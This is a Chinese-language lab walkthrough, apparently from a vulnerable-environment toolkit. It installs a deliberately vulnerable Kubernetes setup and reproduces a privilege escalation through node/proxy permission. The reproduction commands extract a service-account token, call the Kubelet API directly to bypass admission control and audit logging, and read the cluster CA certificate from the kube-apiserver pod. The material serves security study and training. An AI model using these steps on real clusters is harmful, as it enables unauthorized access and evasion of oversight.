# 利用Node/Proxy进行权限提升

## 场景介绍

研究发现，具有Node/Proxy权限的K8s用户可以绕过API server的认证，直接和Kubelet进行通信，从而绕过K8s的准入控制和日志审计，达到权限提升的效果。

## 环境搭建

基础环境（Docker+K8s）准备（如果已经有任意版本的Docker+K8s环境则可跳过）：

```bash
./metarget gadget install docker --version 18.03.1
./metarget gadget install k8s --version 1.16.5 --domestic
```

漏洞环境准备：

```bash
./metarget cnv install k8s_node_proxy
```

执行完成后，K8s集群内`metarget`命令空间下将会创建一个名为`k8s_node_proxy`的pod。

## 漏洞复现

利用具有node/proxy权限的token值去访问Kubelet，发现可以执行在理论情况下无权限执行的命令，则权限提升成功：

```
1. sudo kubectl get secrets -n metarget | grep node-proxy	#获取secrets名
k8s-node-proxy-token-qdkqv           kubernetes.io/service-account-token   3      22m
2. sudo kubectl get secrets k8s-node-proxy-token-qdkqv -n metarget -o yaml #获取token值
3. token=`(echo xxxx | base 64 -d)` #token编码
4. curl -k https://kubelet-ip:kubelet-port/runningpods/ -H "Authorization: Bearer $token"	#查询集群内运行的pod
或
curl -k https://kubelet-ip:kubelet-port/run/kube-system/<apiserver-pod>/<container-name> -H "Authorization: Bearer $token" -d "cmd=cat+/etc/kubernetes/pki/ca.crt"	# 查询kube-apiserver pod中的证书
```

## 参考文献

1. https://blog.aquasec.com/privilege-escalation-kubernetes-rbac